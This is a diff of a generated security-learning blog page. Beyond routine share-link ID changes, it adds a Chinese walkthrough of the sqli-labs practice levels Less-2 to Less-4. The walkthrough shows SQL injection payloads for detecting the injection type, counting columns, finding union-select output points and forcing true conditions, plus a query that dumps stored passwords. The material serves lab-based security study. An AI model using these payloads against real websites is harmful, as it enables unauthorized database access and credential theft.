@@ -79,7 +79,7 @@
         
         <div class="comments-link">
             
-            <a href="javascript:void(0);" data-url="http://noobxw.github.io/2022/01/31/SQL%E6%B3%A8%E5%85%A5%E5%AD%97%E7%AC%A6%E5%9E%8B%E5%92%8C%E6%95%B0%E5%AD%97%E5%9E%8B%E5%88%A4%E6%96%AD/" data-id="ckz2ws3v7000d64maeanh11rq" class="leave-reply bdsharebuttonbox" data-cmd="more">Share</a>
+            <a href="javascript:void(0);" data-url="http://noobxw.github.io/2022/01/31/SQL%E6%B3%A8%E5%85%A5%E5%AD%97%E7%AC%A6%E5%9E%8B%E5%92%8C%E6%95%B0%E5%AD%97%E5%9E%8B%E5%88%A4%E6%96%AD/" data-id="ckz30tetn0003n4ma0w2j1chr" class="leave-reply bdsharebuttonbox" data-cmd="more">Share</a>
         </div><!-- .comments-link -->
       </header><!-- .entry-header -->
 
@@ -216,7 +216,7 @@
         
         <div class="comments-link">
             
-            <a href="javascript:void(0);" data-url="http://noobxw.github.io/2022/01/30/Less1-Less4/" data-id="ckz2ws3ux000664ma0v0c36qk" class="leave-reply bdsharebuttonbox" data-cmd="more">Share</a>
+            <a href="javascript:void(0);" data-url="http://noobxw.github.io/2022/01/30/Less1-Less4/" data-id="ckz30tetk0001n4maekwb936c" class="leave-reply bdsharebuttonbox" data-cmd="more">Share</a>
         </div><!-- .comments-link -->
       </header><!-- .entry-header -->
 
@@ -293,9 +293,91 @@
 <p>爆密码语句：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select group_concat(password) from security.users</span><br></pre></td></tr></table></figure>
 
+<hr>
+<h3 id="Lees-2（数字型注入）"><a href="#Lees-2（数字型注入）" class="headerlink" title="Lees-2（数字型注入）"></a>Lees-2（数字型注入）</h3><p>##0x00</p>
+<p>先进行判断，执行下列语句：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://sqli-labs-master/Less-2/?id=2</span><br></pre></td></tr></table></figure>
+
+<p>页面正常</p>
+<p><img src="/2022/01/30/Less1-Less4/image-20220201004057893.png" alt="image-20220201004057893"></p>
+<h2 id="0x01-1"><a href="#0x01-1" class="headerlink" title="0x01"></a>0x01</h2><p>注入：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://sqli-labs-master/Less-2/?id=2  and 1=2 --+</span><br></pre></td></tr></table></figure>
+
+<p>页面异常，可得知为数字型注入。</p>
+<p><img src="/2022/01/30/Less1-Less4/image-20220201004229348.png" alt="image-20220201004229348"></p>
+<h2 id="0x02-1"><a href="#0x02-1" class="headerlink" title="0x02"></a>0x02</h2><p>判断字段数：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://sqli-labs-master/Less-2/?id=2  order by 4 --+</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/01/30/Less1-Less4/image-20220201004438346.png" alt="image-20220201004438346"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://sqli-labs-master/Less-2/?id=2  order by 3 --+</span><br></pre></td></tr></table></figure>
+
+<p>页面正常。</p>
+<p><img src="/2022/01/30/Less1-Less4/image-20220201004525522.png" alt="image-20220201004525522"></p>
+<h2 id="0x03-1"><a href="#0x03-1" class="headerlink" title="0x03"></a>0x03</h2><p>后续操作和字符型注入一样。</p>
+<hr>
+<h3 id="Lees-3"><a href="#Lees-3" class="headerlink" title="Lees-3"></a>Lees-3</h3><h2 id="0x00-1"><a href="#0x00-1" class="headerlink" title="0x00"></a>0x00</h2><p>使用?id=’进行尝试注入：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://sqli-labs-master/Less-3/?id=&#x27;</span><br></pre></td></tr></table></figure>
+
+<p>注入代码后，我们得到像这样的一个错误：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">MySQL server version for the right syntax to use near ””) LIMIT 0,1′</span><br></pre></td></tr></table></figure>
+
+<p>这里它意味着，开发者使用的查询是：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Select login_name, select password from table where id= (‘our input here’)</span><br></pre></td></tr></table></figure>
+
+<p>而源码当中也是如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM users WHERE id=(&#x27;$id&#x27;) LIMIT 0,1</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/01/30/Less1-Less4/image-20220201012339751.png" alt="image-20220201012339751"></p>
+<h2 id="0x01-2"><a href="#0x01-2" class="headerlink" title="0x01"></a>0x01</h2><p>因此可以尝试这样注入：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://sqli-labs-master/Less-3/?id=1&#x27;)--+</span><br></pre></td></tr></table></figure>
+
+<p>页面返回正常</p>
+<p><img src="/2022/01/30/Less1-Less4/image-20220201012811806.png" alt="image-20220201012811806"></p>
+<h2 id="0x02-2"><a href="#0x02-2" class="headerlink" title="0x02"></a>0x02</h2><p>接下来可以判断字段数：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://sqli-labs-master/Less-3/?id=1&#x27;) order by 3 --+</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/01/30/Less1-Less4/image-20220201014121063.png" alt="image-20220201014121063"></p>
+<h2 id="0x03-2"><a href="#0x03-2" class="headerlink" title="0x03"></a>0x03</h2><p>判断回显点：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://sqli-labs-master/Less-3/?id=-1&#x27;) union select 1,2,3 --+</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/01/30/Less1-Less4/image-20220201014321625.png" alt="image-20220201014321625"></p>
+<h2 id="0x04-1"><a href="#0x04-1" class="headerlink" title="0x04"></a>0x04</h2><p>其实除了?id=1’)注入以外，根据源码可以判断出其他的注入语句：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#x27;) or &#x27;1&#x27;=(&#x27;1&#x27;</span><br><span class="line">) or 1=1 --+</span><br></pre></td></tr></table></figure>
+
+<p>第一句**’) or ‘1’=(‘1’**只要使SQL语句的语法正确，即使括号配对即可成功注入；</p>
+<p>第二句) **or 1=1 –+<strong>通过注释符把后面的</strong>‘)**注释掉即可。</p>
+<p><img src="/2022/01/30/Less1-Less4/image-20220201015418821.png" alt="image-20220201015418821"></p>
+<p><img src="/2022/01/30/Less1-Less4/image-20220201015108788.png" alt="image-20220201015108788"></p>
+<h2 id="0x05-1"><a href="#0x05-1" class="headerlink" title="0x05"></a>0x05</h2><p>其余的 payload 与 less1 中一致，只需要将 less-1 中的 ‘ 添加） 即’) </p>
+<hr>
+<h3 id="Less-4"><a href="#Less-4" class="headerlink" title="Less-4"></a>Less-4</h3><h2 id="0x00-2"><a href="#0x00-2" class="headerlink" title="0x00"></a>0x00</h2><p>使用以下代码进行注入：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://sqli-labs-master/Less-4/?id=1&quot;</span><br></pre></td></tr></table></figure>
+
+<p>注入代码后，我们得到像这样的一个错误：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">You have an error in your SQL syntax; check the manual that corresponds to your MySQ L server version for the right syntax to use near &#x27;&quot;1&quot;&quot;) LIMIT 0,1&#x27; at line</span><br></pre></td></tr></table></figure>
+
+<p>这里它意味着，代码当中对 id 参数进行了 “” 和 () 的包装。</p>
+<p>查看源代码：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$id = &#x27;&quot;&#x27; . $id . &#x27;&quot;&#x27;;</span><br><span class="line">$sql=&quot;SELECT * FROM users WHERE id=($id) LIMIT 0,1&quot;;</span><br></pre></td></tr></table></figure>
+
+<p>第一行id进行了””包装，之后第二行进行了()包装</p>
+<p><img src="/2022/01/30/Less1-Less4/image-20220201021526614.png" alt="image-20220201021526614"></p>
+<h2 id="0x01-3"><a href="#0x01-3" class="headerlink" title="0x01"></a>0x01</h2><p>再用如下代码注入：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://sqli-labs-master/Less-4/?id=1&quot;) --+</span><br></pre></td></tr></table></figure>
+
+<p>页面返回正常</p>
+<p><img src="/2022/01/30/Less1-Less4/image-20220201021849009.png" alt="image-20220201021849009"></p>
+<h2 id="0x02-3"><a href="#0x02-3" class="headerlink" title="0x02"></a>0x02</h2><p>判断字段数：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://sqli-labs-master/Less-4/?id=1&quot;)  order by 4--+</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/01/30/Less1-Less4/image-20220201022028864.png" alt="image-20220201022028864"></p>
+<h2 id="0x03-3"><a href="#0x03-3" class="headerlink" title="0x03"></a>0x03</h2><p>与Less-3一样，可成功注入的有：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">“) or ”1”=(“1</span><br><span class="line">“) or 1=1 --+</span><br></pre></td></tr></table></figure>
 
 
-<h3 id="Lees-2（数字型注入）"><a href="#Lees-2（数字型注入）" class="headerlink" title="Lees-2（数字型注入）"></a>Lees-2（数字型注入）</h3>
+
+<h2 id="0x04-2"><a href="#0x04-2" class="headerlink" title="0x04"></a>0x04</h2><p>其余的 payload 与 less1 中一致，只需要将 less-1 中的 ‘ 更换为 “)。</p>
+
       
     </div><!-- .entry-content -->
 
@@ -331,7 +413,7 @@
         
         <div class="comments-link">
             
-            <a href="javascript:void(0);" data-url="http://noobxw.github.io/2022/01/30/%E7%AE%80%E8%A6%81SQL%E6%B3%A8%E5%85%A5/" data-id="ckz2ws3v8000g64ma6ge8h5pj" class="leave-reply bdsharebuttonbox" data-cmd="more">Share</a>
+            <a href="javascript:void(0);" data-url="http://noobxw.github.io/2022/01/30/%E7%AE%80%E8%A6%81SQL%E6%B3%A8%E5%85%A5/" data-id="ckz30teu1000gn4ma8k9d0fjx" class="leave-reply bdsharebuttonbox" data-cmd="more">Share</a>
         </div><!-- .comments-link -->
       </header><!-- .entry-header -->
 
@@ -451,7 +533,7 @@
         
         <div class="comments-link">
             
-            <a href="javascript:void(0);" data-url="http://noobxw.github.io/2022/01/30/WEB%E6%BC%8F%E6%B4%9E%E7%9F%A5%E8%AF%86%E7%82%B9/" data-id="ckz2ws3ut000264ma0i6mcg5h" class="leave-reply bdsharebuttonbox" data-cmd="more">Share</a>
+            <a href="javascript:void(0);" data-url="http://noobxw.github.io/2022/01/30/WEB%E6%BC%8F%E6%B4%9E%E7%9F%A5%E8%AF%86%E7%82%B9/" data-id="ckz30tetq0007n4ma1h2ifwge" class="leave-reply bdsharebuttonbox" data-cmd="more">Share</a>
         </div><!-- .comments-link -->
       </header><!-- .entry-header -->
 
@@ -517,7 +599,7 @@
         
         <div class="comments-link">
             
-            <a href="javascript:void(0);" data-url="http://noobxw.github.io/2022/01/28/%E6%9E%B6%E6%9E%84%EF%BC%8C%E6%90%AD%E5%BB%BA%EF%BC%8CWAF%E7%AD%89/" data-id="ckz2ws3v9000h64ma7b3ueqc1" class="leave-reply bdsharebuttonbox" data-cmd="more">Share</a>
+            <a href="javascript:void(0);" data-url="http://noobxw.github.io/2022/01/28/%E6%9E%B6%E6%9E%84%EF%BC%8C%E6%90%AD%E5%BB%BA%EF%BC%8CWAF%E7%AD%89/" data-id="ckz30teu2000hn4ma6xc5ctda" class="leave-reply bdsharebuttonbox" data-cmd="more">Share</a>
         </div><!-- .comments-link -->
       </header><!-- .entry-header -->
 
@@ -602,7 +684,7 @@
         
         <div class="comments-link">
             
-            <a href="javascript:void(0);" data-url="http://noobxw.github.io/2022/01/28/CDN%E7%BB%95%E8%BF%87%E6%8A%80%E6%9C%AF/" data-id="ckz2ws3ui000064ma3zh1eugi" class="leave-reply bdsharebuttonbox" data-cmd="more">Share</a>
+            <a href="javascript:void(0);" data-url="http://noobxw.github.io/2022/01/28/CDN%E7%BB%95%E8%BF%87%E6%8A%80%E6%9C%AF/" data-id="ckz30tetg0000n4ma8q9bhljc" class="leave-reply bdsharebuttonbox" data-cmd="more">Share</a>
         </div><!-- .comments-link -->
       </header><!-- .entry-header -->
 
@@ -673,7 +755,7 @@
         
         <div class="comments-link">
             
-            <a href="javascript:void(0);" data-url="http://noobxw.github.io/2022/01/27/%E5%8A%A0%E5%AF%86%E7%BC%96%E7%A0%81%E7%AE%97%E6%B3%95/" data-id="ckz2ws3uu000364maaadr3qbz" class="leave-reply bdsharebuttonbox" data-cmd="more">Share</a>
+            <a href="javascript:void(0);" data-url="http://noobxw.github.io/2022/01/27/%E5%8A%A0%E5%AF%86%E7%BC%96%E7%A0%81%E7%AE%97%E6%B3%95/" data-id="ckz30tetr0008n4mae952hx5n" class="leave-reply bdsharebuttonbox" data-cmd="more">Share</a>
         </div><!-- .comments-link -->
       </header><!-- .entry-header -->
 
@@ -740,7 +822,7 @@
         
         <div class="comments-link">
             
-            <a href="javascript:void(0);" data-url="http://noobxw.github.io/2022/01/26/%E7%B3%BB%E7%BB%9F%E5%8F%8A%E6%95%B0%E6%8D%AE%E5%BA%93/" data-id="ckz2ws3va000i64ma4f8od166" class="leave-reply bdsharebuttonbox" data-cmd="more">Share</a>
+            <a href="javascript:void(0);" data-url="http://noobxw.github.io/2022/01/26/%E7%B3%BB%E7%BB%9F%E5%8F%8A%E6%95%B0%E6%8D%AE%E5%BA%93/" data-id="ckz30teu3000in4maf1tg2wuj" class="leave-reply bdsharebuttonbox" data-cmd="more">Share</a>
         </div><!-- .comments-link -->
       </header><!-- .entry-header -->
 
@@ -823,7 +905,7 @@
         
         <div class="comments-link">
             
-            <a href="javascript:void(0);" data-url="http://noobxw.github.io/2022/01/25/WEB%E6%BA%90%E7%A0%81%E6%8B%93%E5%B1%95/" data-id="ckz2ws3ur000164ma4jg84g4y" class="leave-reply bdsharebuttonbox" data-cmd="more">Share</a>
+            <a href="javascript:void(0);" data-url="http://noobxw.github.io/2022/01/25/WEB%E6%BA%90%E7%A0%81%E6%8B%93%E5%B1%95/" data-id="ckz30tetm0002n4ma456t9i4k" class="leave-reply bdsharebuttonbox" data-cmd="more">Share</a>
         </div><!-- .comments-link -->
       </header><!-- .entry-header -->
 
@@ -901,7 +983,7 @@
         
         <div class="comments-link">
             
-            <a href="javascript:void(0);" data-url="http://noobxw.github.io/2022/01/24/%E6%90%AD%E5%BB%BA%E5%AE%89%E5%85%A8%E6%8B%93%E5%B1%95/" data-id="ckz2ws3v6000c64ma8zda7uxt" class="leave-reply bdsharebuttonbox" data-cmd="more">Share</a>
+            <a href="javascript:void(0);" data-url="http://noobxw.github.io/2022/01/24/%E6%90%AD%E5%BB%BA%E5%AE%89%E5%85%A8%E6%8B%93%E5%B1%95/" data-id="ckz30tety000cn4ma1thh2e43" class="leave-reply bdsharebuttonbox" data-cmd="more">Share</a>
         </div><!-- .comments-link -->
       </header><!-- .entry-header -->
 
